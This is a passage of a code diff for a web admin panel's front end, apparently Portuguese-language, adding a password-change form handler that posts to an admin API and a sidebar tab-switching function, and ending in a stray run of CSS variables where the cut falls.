+async function changeAdminPassword() { const current = document.getElementById('currentPass').value; const newPass = document.getElementById('newPass').value; const confirm = document.getElementById('confirmPass').value; if(!current || !newPass || newPass.length < 6 || newPass !== confirm) { document.getElementById('passwordMsg').innerHTML = '<span style="color:#ef4444;">Preencha corretamente (mínimo 6 caracteres)</span>'; setTimeout(() => document.getElementById('passwordMsg').innerHTML = '', 3000); return; } const res = await fetch('/api/admin/change-password', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify({ senha_antiga: current, nova_senha: newPass }) }); const data = await res.json(); if(data.success) { document.getElementById('passwordMsg').innerHTML = '<span style="color:#10b981;">Senha alterada com sucesso!</span>'; document.getElementById('currentPass').value = ''; document.getElementById('newPass').value = ''; document.getElementById('confirmPass').value = ''; } else { document.getElementById('passwordMsg').innerHTML = `<span style="color:#ef4444;">${data.error}</span>`; } setTimeout(() => document.getElementById('passwordMsg').innerHTML = '', 3000); }
+
+function switchTab(tabName) {
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    document.getElementById(`tab${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`).classList.add('active');
+    document.querySelectorAll('.sidebar-menu a').forEach(l => l.classList.remove('active'));
+    const activeLink = Array.from(document.querySelectorAll('.sidebar-menu a')).find(a => a.getAttribute('data-tab') === tabName);
+    if(activeLink) activeLink.classList.add('active');
+    if(window.innerWidth <= 768) document.getElementById('sidebar')?.classList.remove('mobile-open');
+}
+</script>
+</body>
+</html>            --accent-hover: #2563eb;
             --accent-light: rgba(59,130,246,0.08);
             --bg: #f0f2f8;
             --bg-card: #ffffff;
